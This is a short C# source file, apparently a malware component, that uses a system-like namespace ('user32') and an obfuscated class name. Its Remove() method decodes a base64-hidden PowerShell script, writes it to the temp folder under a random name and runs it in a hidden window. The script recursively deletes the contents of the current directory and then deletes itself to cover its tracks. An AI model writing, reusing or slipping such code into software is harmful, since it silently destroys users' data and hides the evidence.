using System;
using System.IO;
using System.Linq;
using System.Text;
using System.Diagnostics;

namespace user32
{
    public class jhkasd
    {
        public static void Remove()
        {
            string s = "cGFyYW0oJDEsICQyKQ0KZnVuY3Rpb24gUmVtb3ZlIHsNCiAgICBwYXJhbSAoJHApDQogICAgR2V0LUNoaWxkSXRlbSAtUGF0aCAkcCAtSW5jbHVkZSAqIHwgcmVtb3ZlLUl0ZW0gLXJlY3Vyc2UNCn0NCg0KZnVuY3Rpb24gUmVtb3ZlSXRzZWxmIHsNCiAgICBwYXJhbSAoJG4pDQogICAgJHAgPSAkUFNTY3JpcHRSb290DQogICAgUmVtb3ZlLUl0ZW0gLVBhdGggJHBcJG4NCn0NCg0KUmVtb3ZlICQxDQpSZW1vdmVJdHNlbGYgJDI=";
            string n = RandomString(10);
            string p = System.IO.Path.GetTempPath()+n+".ps1";
            string args = Directory.GetCurrentDirectory();
            File.WriteAllBytes(p, Convert.FromBase64String(s));
            ProcessStartInfo startInfo = new ProcessStartInfo();
            startInfo.FileName = @"powershell.exe";
            startInfo.Arguments = @"& " + p + " " + args + " " + n + ".ps1";
            startInfo.UseShellExecute = false;
            startInfo.CreateNoWindow = true;
            Process process = new Process();
            process.StartInfo = startInfo;
            process.Start();
        }

        private static Random random = new Random();

        private static string RandomString(int length)
        {
            const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
            return new string(Enumerable.Repeat(chars, length)
                .Select(s => s[random.Next(s.Length)]).ToArray());
        }
    }
}
